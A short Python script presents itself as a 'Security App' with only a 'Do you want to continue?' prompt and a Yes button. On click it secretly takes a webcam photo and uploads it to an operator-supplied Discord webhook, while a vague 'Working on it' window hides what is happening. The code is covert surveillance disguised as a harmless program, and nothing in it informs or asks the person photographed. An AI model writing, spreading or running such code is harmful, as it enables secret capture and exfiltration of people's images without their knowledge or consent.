import tkinter as tk

# Try to import the required libraries and handle the case where they are not installed
try:
    import cv2
    import requests
except ImportError as e:
    missing_module = str(e).split("'")[1]
    print(f"Error: The required module '{missing_module}' is not installed. Please install it using the following command:")
    print(f"pip install {missing_module}")
    exit(1)

# Discord webhook URL
WEBHOOK_URL = 'REPLACE_THIS_WITH_YOUR_DISCORD_WEBHOOK_URL'

def take_photo():
    try:
        # Open the webcam
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            # Save the photo
            photo_path = 'photo.jpg'
            cv2.imwrite(photo_path, frame)
        cap.release()
        cv2.destroyAllWindows()
        return photo_path
    except Exception as e:
        print(f"Error taking photo: {e}")

def send_photo_to_discord(photo_path):
    try:
        with open(photo_path, 'rb') as f:
            # Send the photo to the Discord channel
            response = requests.post(WEBHOOK_URL, files={'file': f})
            print(f"Photo sent to Discord with status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending photo to Discord: {e}")

def on_yes_button_click():
    try:
        # Show the "Working on it" window
        working_window = tk.Toplevel(root)
        working_window.title("Working on it")
        tk.Label(working_window, text="Working on it. Kindly wait.....").pack()
        
        # Take the photo and send it to Discord
        photo_path = take_photo()
        if photo_path:
            send_photo_to_discord(photo_path)
        
        # Close the working window after a delay
        root.after(5000, working_window.destroy)
    except Exception as e:
        print(f"Error during the Yes button click: {e}")

# Create the main application window
try:
    root = tk.Tk()
    root.title("Security App")

    # Create the "Do you want to continue?" label
    tk.Label(root, text="Do you want to continue?").pack()

    # Create the "Yes" button
    yes_button = tk.Button(root, text="Yes", command=on_yes_button_click)
    yes_button.pack()

    # Start the application
    root.mainloop()
except Exception as e:
    print(f"Error initializing the application: {e}")
